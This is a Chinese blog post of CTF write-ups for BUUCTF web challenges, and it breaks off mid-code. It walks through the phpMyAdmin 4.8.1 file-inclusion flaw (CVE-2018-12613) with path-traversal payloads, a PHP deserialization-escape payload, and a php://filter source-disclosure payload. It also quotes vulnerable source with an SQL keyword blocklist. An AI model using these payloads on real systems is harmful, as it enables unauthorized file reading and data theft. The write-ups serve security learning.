<!DOCTYPE html>
<html lang="zh-Hans">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="一个彩笔">
  <meta name="author" content="dWm2">
  <meta name="keywords" content="dWm2">
  <title>BUUCTF WEB wp ~ dWm2&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>


<body>
  <header style="height: 100vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>dWm2's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">Categories</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background"
         style="background: url('/img/2.jpg')no-repeat center center;
           background-size: cover;
           background-attachment: fixed;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  Monday, October 21st 2019, 12:00 am
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    17.5k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      86 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
            <div class="scroll-down-bar">
              <i class="fas fa-angle-down scroll-down-arrow"></i>
            </div>
          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="HCTF2018WarmUp"><a href="#HCTF2018WarmUp" class="headerlink" title="HCTF2018WarmUp"></a>HCTF2018WarmUp</h1><p>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p>
<a id="more"></a>

<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$_page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##不能为空</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##是字符串</span>
        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##上面checkfile返回为true</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
<span class="token delimiter">?></span></code></pre>
<p>hint.php</p>
<pre><code>flag not here, and flag in ffffllllaaaagggg</code></pre><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>构造payload:</p>
<pre><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code></pre><p>传入得到flag</p>
<p>具体为啥这么构造，参考下面的漏洞。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p>
<h2 id="phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p>
<p>$_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</p>
<p>$_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>   在index.php里50-63行</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// If we have a valid target, let's load that script instead</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>满足五个条件：$_REQUEST[‘target’]不为空，是字符串，不以index开头，<strong><em>Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件</em></strong></p>
<p>代码在libraries\classes\Core.php 443-476行</p>
<p>Core::checkPageValidity</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$_page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>mb_substr:截取字符串（与substr的区别是它可以截取中文）<br>mb_strpos:匹配（同理，可截取中文）<br>可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作<br>第一次很好理解，这里不再叙述<br>phpmyadmin团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次截取<br>而就在这里出现了漏洞<br><strong>构造payload:</strong><br><code>target=db_sql.php%253f/../../test.txt</code><br>浏览器自行解码一次<br>变成:<br><code>target=db_sql.php%3f/../../test.txt</code><br>也就是说传入的数据里没？<br>所以这时的<strong>$page</strong>没被截取，<strong>$_page</strong>的值依然等于<strong>$page</strong><br>继续往下看，先经过函数urldecode一次<br>变成：<br><code>target=db_sql.php?/../../test.txt</code><br>这时候截取到问号前即$_page=db_dql.php, 符合条件通过下面的if判断,接着包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)，达到读取test.txt的目的</p>
<p>参考：</p>
<p>[]: <a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">https://www.jianshu.com/p/0d75017c154f</a></p>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p><strong>考点：反序列化逃逸</strong></p>
<p>先扫一波后台发现 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>核心功能在以下三个文件里</p>
<p><a href="https://imgchr.com/i/0AZYuT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AZYuT.png" srcset="/img/loading.gif" alt="0AZYuT.png"></a></p>
<p>同时扫出来的还有注册界面和config.php。鉴于zip文件里没给config.php，猜测flag与此文件有关。</p>
<p>先注个册进入上传页面抓个包。</p>
<p>下面是代码审计部分：</p>
<p>存：传参进profile[]里(update.php)–&gt;profile[]序列化–&gt;updatefile函数(class.php)<br><a href="https://imgchr.com/i/0AE9KO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AE9KO.png" srcset="/img/loading.gif" alt="0AE9KO.png"></a></p>
<p>–&gt;filter函数检测（where-&gt;hacker）–&gt;存数据库</p>
<p><img src="https://s1.ax1x.com/2020/09/27/0AEFVH.png" srcset="/img/loading.gif" alt="0AEFVH.png"></p>
<p><a href="https://imgchr.com/i/0AEAIA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEAIA.png" srcset="/img/loading.gif" alt="0AEAIA.png"></a></p>
<p>取：反序列化profile<a href="profile.php"></a>–&gt;file_get_contents取profile[$photo]读</p>
<p><a href="https://imgchr.com/i/0AEmxf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEmxf.png" srcset="/img/loading.gif" alt="0AEmxf.png"></a></p>
<p>可利用之处就在filter函数中对username的检测:<br>若内容存在五位的where则会将它替换为六位的hacker。<br>又因为对photo的值有规定，我们只能考虑重新构造photo,<br>结合以上在这里利用反序列化逃逸。<br>初版构造的photo如下：</p>
<pre><code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p><a href="https://imgchr.com/i/0AVpYn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AVpYn.md.png" srcset="/img/loading.gif" alt="0AVpYn.md.png"></a></p>
<p>失败原因是这里对nickname有长度限制，直接用数组绕过<br>其次这里还有个坑，如果你传入的是nickname[],他的反序列化不是这样</p>
<pre><code>a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></pre><p>而是这样的</p>
<pre><code>a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;aaa&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></pre><p>所以终版构造的photo是这样的</p>
<pre><code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>一共是三十四个字符。<br>由于代码对username的检测，每多一个where被替换为hacker，就多一个字符的位置，为了替换后构造的photo能成功的被挤出去，也就需要三十四个where。<br>综上，payload为</p>
<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>如图传入再访问profile.php,在源代码得到flag。</p>
<p><a href="https://imgchr.com/i/0AEasU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEasU.png" srcset="/img/loading.gif" alt="0AEasU.png"></a></p>
<p><img src="https://s1.ax1x.com/2020/09/27/0Ae1de.png" srcset="/img/loading.gif" alt="0Ae1de.png"></p>
<h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p><strong>考点：php伪协议、报错注入</strong></p>
<p>结合实事，来一道2077。</p>
<p>首页是个提交订单的页面，表单中提交姓名、电话、地址三个参数。下面还有几个订单管理的功能。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201129174439542.png" srcset="/img/loading.gif" alt="image-20201129174439542"></p>
<p>查看源码发现提示</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201129174455970.png" srcset="/img/loading.gif" alt="image-20201129174455970"></p>
<p>那就先试试用伪协议把源码读一读</p>
<p>payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#change.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单修改成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#confirm.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//var_dump($_POST);</span>

